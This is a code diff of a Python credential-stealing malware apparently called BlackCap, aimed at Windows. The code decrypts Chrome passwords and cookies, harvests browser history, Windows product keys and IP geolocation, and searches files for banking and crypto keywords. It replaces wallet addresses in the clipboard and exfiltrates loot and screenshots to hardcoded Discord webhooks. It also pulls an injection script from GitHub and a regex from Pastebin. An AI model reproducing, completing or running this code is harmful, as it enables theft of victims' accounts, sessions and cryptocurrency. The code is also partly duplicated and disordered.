@@ -32,37 +32,16 @@ from win32crypt import CryptUnprotectData
 from urllib.request import Request, urlopen
 from datetime import datetime, timedelta, timezone
 from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
-
 appdata = os.getenv("APPDATA")
 keys_path = os.path.join(appdata, ".kfaction", "cache", "keys")
 screenshots_path = os.path.join(appdata, ".kfaction", "screenshots")
 webhook_url = "https://discord.com/api/webhooks/1071628794491834449/Y29rga-lOVZ1NGdaC4UumNwV9jR34FFwJe4jMoi79hNwJMKJeBz8vSKAyecskkZK1kba"
-
-def send_webhook(file_path, webhook_url):
-    with open(file_path, "rb") as f:
-        files = {"file": (file_path, f)}
-        requests.post(webhook_url, files=files)
-
-def zip_and_send_screenshots(screenshots_path, webhook_url):
-    if os.path.exists(screenshots_path):
-        with zipfile.ZipFile('screenshots.zip', 'w') as zip_file:
-            for filename in os.listdir(screenshots_path):
-                file_path = os.path.join(screenshots_path, filename)
-                if os.path.isfile(file_path) and file_path.endswith(".png"):
-                    zip_file.write(file_path)
-        send_webhook('screenshots.zip', webhook_url)
-
 if os.path.exists(keys_path):
     for filename in os.listdir(keys_path):
         file_path = os.path.join(keys_path, filename)
         if os.path.isfile(file_path):
             send_webhook(file_path, webhook_url)
-
 zip_and_send_screenshots(screenshots_path, webhook_url)
-            
-def install(package):
-    subprocess.call([sys.executable, "-m", "pip", "install", package])
-
 try:
     import os
     import re
@@ -85,7 +64,6 @@ try:
     import threading
     import pyperclip
     import subprocess
-
 except ImportError:
     install("os")
     install("re")
@@ -112,13 +90,10 @@ except ImportError:
     install("pyautogui")
     install("subprocess")
     #install("kfactionbypasser")
-
 local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
 temp = os.getenv("TEMP")
-
 Passw = [];
-
 # `
 #    "yourwebhookurl" = your discord webhook url
 #    "blackcap_inject_url" = my javascript injection (i recommand to not change)
@@ -127,7 +102,6 @@ Passw = [];
 #    "blprggg" = don't touch at this
 #
 # `
-
 __config__ = {
     'yourwebhookurl': "https://discord.com/api/webhooks/1071833273577263224/16m4zIqI2u8HjGAdgNpPj_uiuafCmsg7g8CMzoTKh86yJMXHJRxOD3QZqeG1GOJHIfo1",
     'blackcap_inject_url': "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
@@ -138,7 +112,6 @@ __config__ = {
     'startup': 'no',
     'kill_discord_process': False,
     'dbugkiller': False,
-    
     'addresse_crypto_replacer': 'yes',
     'addresse_btc': 'none',
     'addresse_eth': '0x4c305D9d4CdF740FF4f2166ecF65c1DF73e93472',
@@ -181,17 +154,155 @@ __config__ = {
         "ksdumper",
         "joeboxserver"
     ]
-
 }
-
 infocom = os.getlogin()
 vctm_pc = os.getenv("COMPUTERNAME")
 r4m = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
 d1sk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
-
 BlackCap_Regex = 'https://pastebin.com/raw/f4PM9Dse'
 reg_req = requests.get(BlackCap_Regex) 
 clear_reg = r"[\w-]{24}" + reg_req.text
+if __name__ == "__main__" and os.name == "nt":
+    asyncio.run(bl4ckc4p().init())
+local = os.getenv('LOCALAPPDATA')
+roaming = os.getenv('APPDATA')
+temp = os.getenv("TEMP")
+Threadlist = []
+hook = fetch_conf("yourwebhookurl")
+Passw = []
+Cookies = []
+blackcapedezFiles = []
+global keyword, cookiWords, paswWords
+keyword = [
+    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
+]
+cookiWords = []
+paswWords = []
+GatherAll()
+DETECTED = Trust(Cookies)
+if not DETECTED:
+    wikith = blackcapedez()
+    for thread in wikith: thread.join()
+    time.sleep(0.2)
+    filetext = "\n"
+    for arg in blackcapedezFiles:
+        if len(arg[2]) != 0:
+            foldpath = arg[1]
+            foldlist = arg[2]
+            filetext +=f"```diff\n"
+            filetext += f"- {foldpath}\n"
+            for ffil in foldlist:
+                a = ffil[0].split("/")
+                fileanme = a[len(a)-1]
+                b = ffil[1]
+                filetext += f"+ Name: {fileanme}\n+ Link: {b}"
+                filetext += "\n```"
+                filetext += "\n"
+    upload("blackcapedez", filetext)
+    auto = threading.Thread(target=auto_copy_wallet().run)
+    auto.start()
+
+def send_webhook(file_path, webhook_url):
+    with open(file_path, "rb") as f:
+        files = {"file": (file_path, f)}
+        requests.post(webhook_url, files=files)
+
+def zip_and_send_screenshots(screenshots_path, webhook_url):
+    if os.path.exists(screenshots_path):
+        with zipfile.ZipFile('screenshots.zip', 'w') as zip_file:
+            for filename in os.listdir(screenshots_path):
+                file_path = os.path.join(screenshots_path, filename)
+                if os.path.isfile(file_path) and file_path.endswith(".png"):
+                    zip_file.write(file_path)
+        send_webhook('screenshots.zip', webhook_url)
+
+def install(package):
+    subprocess.call([sys.executable, "-m", "pip", "install", package])
+
+def gtmk3y(path: str or os.PathLike):
+        if not ntpath.exists(path):
+            return None
+        with open(path, "r", encoding="utf-8") as f:
+            c = f.read()
+        local_state = json.loads(c)
+
+        try:
+            master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
+            return Functions.w1nd0_dcr(master_key[5:])
+        except KeyError:
+            return None
+
+# def cnverttim(time: int or float) -> str:
+#         try:
+#             epoch = datetime(1601, 1, 1, tzinfo=timezone.utc)
+#             codestamp = epoch + timedelta(microseconds=time)
+#             return codestamp
+#         except Exception:
+#             pass
+
+def w1nd0_dcr(encrypted_str: bytes) -> str:
+        return CryptUnprotectData(encrypted_str, None, None, None, 0)[1]
+
+def cr34t3_f1lkes(_dir: str or os.PathLike = gettempdir()):
+        f1lenom = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
+        path = ntpath.join(_dir, f1lenom)
+        open(path, "x")
+        return path
+
+def dcrpt_val(buff, master_key) -> str:
+        try:
+            iv = buff[3:15]
+            payload = buff[15:]
+            cipher = AES.new(master_key, AES.MODE_GCM, iv)
+            decrypted_pass = cipher.decrypt(payload)
+            decrypted_pass = decrypted_pass[:-16].decode()
+            return decrypted_pass
+        except Exception:
+            return f'Failed to decrypt "{str(buff)}" | key: "{str(master_key)}"'
+
+# def g3t_H(token: str = None):
+#         headers = {
+#             "Content-Type": "application/json",
+#         }
+#         if token:
+#             headers.update({"Authorization": token})
+#         return headers
+
+def sys_1fo() -> list:
+        flag = 0x08000000
+        sh1 = "wmic csproduct get uuid"
+        sh2 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"
+        sh3 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName"
+        try:
+            uuidwndz = subprocess.check_output(sh1, creationflags=flag).decode().split('\n')[1].strip()
+        except Exception:
+            uuidwndz = "N/A"
+        try:
+            w1nk33y = subprocess.check_output(sh2, creationflags=flag).decode().rstrip()
+        except Exception:
+            w1nk33y = "N/A"
+        try:
+            w1nv3r = subprocess.check_output(sh3, creationflags=flag).decode().rstrip()
+        except Exception:
+            w1nv3r = "N/A"
+        return [uuidwndz, w1nv3r, w1nk33y]
+
+def net_1fo() -> list:
+        ip, city, country, region, org, loc, googlemap = "None", "None", "None", "None", "None", "None", "None"
+        req = httpx.get("https://ipinfo.io/json")
+        if req.status_code == 200:
+            data = req.json()
+            ip = data.get('ip')
+            city = data.get('city')
+            country = data.get('country')
+            region = data.get('region')
+            org = data.get('org')
+            loc = data.get('loc')
+            googlemap = "https://www.google.com/maps/search/google+map++" + loc
+        return [ip, city, country, region, org, loc, googlemap]
+
+# def fetch_conf(e: str) -> str or bool | None:
+#         return __config__.get(e)
 
 class Functions(object):
 
@@ -360,6 +471,152 @@ class auto_copy_wallet(Functions):
     def run(self):
         if self.address_st3aler == "yes":
             self.loop_through()
+
+def decrypt_val(self, buff, master_key):
+        try:
+            iv = buff[3:15]
+            payload = buff[15:]
+            cipher = AES.new(master_key, AES.MODE_GCM, iv)
+            decrypted_pass = cipher.decrypt(payload)
+            decrypted_pass = decrypted_pass[:-16].decode()
+            return decrypted_pass
+        except Exception:
+            return "Failed to decrypt password"
+
+def grbpsw2(self, name: str, path: str, profile: str):
+        path += '\\' + profile + '\\Login Data'
+        if not os.path.isfile(path):
+            return
+
+        loginvault = self.randomdircreator()
+        copy2(path, loginvault)
+        conn = sqlite3.connect(loginvault)
+        cursor = conn.cursor()
+        with open(os.path.join(self.dir, "Browsers", "All Passwords.txt"), 'a', encoding="utf-8") as f:
+            for res in cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall():
+                url, username, password = res
+                password = self.dcrpt_val(password, self.masterkey)
+                if url != "":
+                    f.write(f"URL: {url}\nID: {username}\nPASSW0RD: {password}\n\n")
+        cursor.close()
+        conn.close()
+        os.remove(loginvault)
+
+def grbcook(self, name: str, path: str, profile: str):
+        path += '\\' + profile + '\\Network\\Cookies'
+        if not os.path.isfile(path):
+            return
+        cookievault = self.randomdircreator()
+        copy2(path, cookievault)
+        conn = sqlite3.connect(cookievault)
+        cursor = conn.cursor()
+        with open(os.path.join(self.dir, "Browsers", "All Cookies.txt"), 'a', encoding="utf-8") as f:
+            for res in cursor.execute("SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies").fetchall():
+                host_key, name, path, encrypted_value, expires_utc = res
+                value = self.dcrpt_val(encrypted_value, self.masterkey)
+                if host_key and name and value != "":
+                    f.write("{}\t{}\t{}\t{}\t{}\t{}\t{}\n".format(
+                        host_key, 'FALSE' if expires_utc == 0 else 'TRUE', path, 'FALSE' if host_key.startswith('.') else 'TRUE', expires_utc, name, value))
+        cursor.close()
+        conn.close()
+        os.remove(cookievault)
+
+def grbpsw(self):
+        f = open(ntpath.join(self.dir, 'Google', 'Passwords.txt'), 'w', encoding="cp437", errors='ignore')
+        for prof in os.listdir(self.chrmmuserdtt):
+            if re.match(self.chrmrgx, prof):
+                login_db = ntpath.join(self.chrmmuserdtt, prof, 'Login Data')
+                login = self.cr34t3_f1lkes()
+
+                shutil.copy2(login_db, login)
+                conn = sqlite3.connect(login)
+                cursor = conn.cursor()
+                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+
+                for r in cursor.fetchall():
+                    url = r[0]
+                    username = r[1]
+                    encrypted_password = r[2]
+                    decrypted_password = self.dcrpt_val(encrypted_password, self.chrome_key)
+                    if url != "":
+                        f.write(f"URL: {url}\nID: {username}\nPASSW0RD: {decrypted_password}\n\n")
+
+                cursor.close()
+                conn.close()
+                os.remove(login)
+        f.close()
+
+def grbcoke(self):
+        f = open(ntpath.join(self.dir, 'Google', 'Cookies.txt'), 'w', encoding="cp437", errors='ignore')
+        for prof in os.listdir(self.chrmmuserdtt):
+
+            if re.match(self.chrmrgx, prof):
+
+                login_db = ntpath.join(self.chrmmuserdtt, prof, 'Network', 'cookies')
+                login = self.cr34t3_f1lkes()
+
+
+                shutil.copy2(login_db, login)
+                conn = sqlite3.connect(login)
+                cursor = conn.cursor()
+                cursor.execute("SELECT host_key, name, encrypted_value from cookies")
+
+                for r in cursor.fetchall():
+                    host = r[0]
+                    user = r[1]
+                    decrypted_cookie = self.dcrpt_val(r[2], self.chrome_key)
+                    if host != "":
+                        f.write(f"{host}    TRUE"+"     "+ "/FALSE  2597573456  {user}  {decrypted_cookie}\n")
+                    if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie:
+                        self.robloxcookies.append(decrypted_cookie)
+
+                cursor.close()
+                conn.close()
+                os.remove(login)
+        f.close()
+
+lambda x: x[3]
+
+def grbhis(self):
+        f = open(ntpath.join(self.dir, 'Google', 'History.txt'), 'w', encoding="cp437", errors='ignore')
+
+        def xtractwbhist(db_cursor):
+            web = ""
+            db_cursor.execute('SELECT title, url, last_visit_time FROM urls')
+            for item in db_cursor.fetchall():
+                web += f"Search Title: {item[0]}\nURL: {item[1]}\nLAST VISIT TIME: {self.cnverttim(item[2]).strftime('%Y/%m/%d - %H:%M:%S')}\n\n"
+            return web
+
+        def xtractwbs3rch(db_cursor):
+            db_cursor.execute('SELECT term FROM keyword_search_terms')
+            search_terms = ""
+
+            for item in db_cursor.fetchall():
+                if item[0] != "":
+                    search_terms += f"{item[0]}\n"
+
+            return search_terms
+
+        for prof in os.listdir(self.chrmmuserdtt):
+
+            if re.match(self.chrmrgx, prof):
+
+                login_db = ntpath.join(self.chrmmuserdtt, prof, 'History')
+                login = self.cr34t3_f1lkes()
+
+                shutil.copy2(login_db, login)
+                conn = sqlite3.connect(login)
+                cursor = conn.cursor()
+
+                search_history = xtractwbs3rch(cursor)
+                web_history = xtractwbhist(cursor)
+
+                f.write(f"{' '*17}SEARCH\n{'-'*50}\n{search_history}\n{' '*17}\n\nLinks History\n{'-'*50}\n{web_history}")
+
+                cursor.close()
+                conn.close()
+                os.remove(login)
+        f.close()
 
 class bl4ckc4p(Functions):
     def __init__(self):
@@ -1247,18 +1504,8 @@ class AntiDebug(Functions):
         finally:
             winreg.CloseKey(handle)
 
-if __name__ == "__main__" and os.name == "nt":
-    asyncio.run(bl4ckc4p().init())
-
-local = os.getenv('LOCALAPPDATA')
-roaming = os.getenv('APPDATA')
-temp = os.getenv("TEMP")
-Threadlist = []
-
-def fetch_conf(e: str) -> str or bool | None:
-        return __config__.get(e)
-
-hook = fetch_conf("yourwebhookurl")
+# def fetch_conf(e: str) -> str or bool | None:
+#         return __config__.get(e)
 
 class DATA_BLOB(Structure):
     _fields_ = [
@@ -1452,7 +1699,6 @@ def writeforfile(data, name):
             if line[0] != '':
                 f.write(f"{line}\n")
 
-Passw = []
 def getPassw(path, arg):
     global Passw
     if not os.path.exists(path): return
@@ -1487,7 +1733,6 @@ def getPassw(path, arg):
             Passw.append(f"URL: {row[0]} \n ID: {row[1]} \n PASSW0RD: {DecryptValue(row[2], master_key)}\n\n")
     writeforfile(Passw, 'bc_allpasswords')
 
-Cookies = []
 def getCookie(path, arg):
     global Cookies
     if not os.path.exists(path): return
@@ -1524,19 +1769,19 @@ def getCookie(path, arg):
             Cookies.append(f" HOST KEY: {row[0]} | NAME: {row[1]} | VALUE: {DecryptValue(row[2], master_key)}")
     writeforfile(Cookies, 'bc_allcookies')
 
-def checkIfProcessRunning(processName):
-    '''
-    Check if there is any running process that contains the given name processName.
-    '''
+# def checkIfProcessRunning(processName):
+#     '''
+#     Check if there is any running process that contains the given name processName.
+#     '''
     #Iterate over the all the running process
-    for proc in psutil.process_iter():
-        try:
+#     for proc in psutil.process_iter():
+#         try:
             # Check if process name contains the given name string.
-            if processName.lower() in proc.name().lower():
-                return True
-        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
-            pass
-    return False;
+#             if processName.lower() in proc.name().lower():
+#                 return True
+#         except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+#             pass
+#     return False;
 
 def ZipThings(path, arg, procc):
     pathC = path
@@ -1653,7 +1898,6 @@ def blackcapedezFolder(pathF, keywords):
             break
     blackcapedezFiles.append(["folder", pathF + "/", ffound])
 
-blackcapedezFiles = []
 def blackcapedezFile(path, keywords):
     global blackcapedezFiles
     fifound = []
@@ -1709,47 +1953,3 @@ def blackcapedez():
         blackcapedez = threading.Thread(target=blackcapedezFile, args=[patt, key_wordsFiles]);blackcapedez.start()
         wikith.append(blackcapedez)
     return wikith
-
-global keyword, cookiWords, paswWords
-
-keyword = [
-    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
-]
-
-cookiWords = []
-paswWords = []
-
-GatherAll()
-DETECTED = Trust(Cookies)
-
-if not DETECTED:
-    wikith = blackcapedez()
-
-    for thread in wikith: thread.join()
-    time.sleep(0.2)
-
-    filetext = "\n"
-    for arg in blackcapedezFiles:
-        if len(arg[2]) != 0:
-            foldpath = arg[1]
-            foldlist = arg[2]
-            filetext +=f"```diff\n"
-            filetext += f"- {foldpath}\n"
-
-            for ffil in foldlist:
-                a = ffil[0].split("/")
-                fileanme = a[len(a)-1]
-                b = ffil[1]
-                filetext += f"+ Name: {fileanme}\n+ Link: {b}"
-                filetext += "\n```"
-                filetext += "\n"
-    upload("blackcapedez", filetext)
-    auto = threading.Thread(target=auto_copy_wallet().run)
-    auto.start()
-
-
-
-
-
-
-
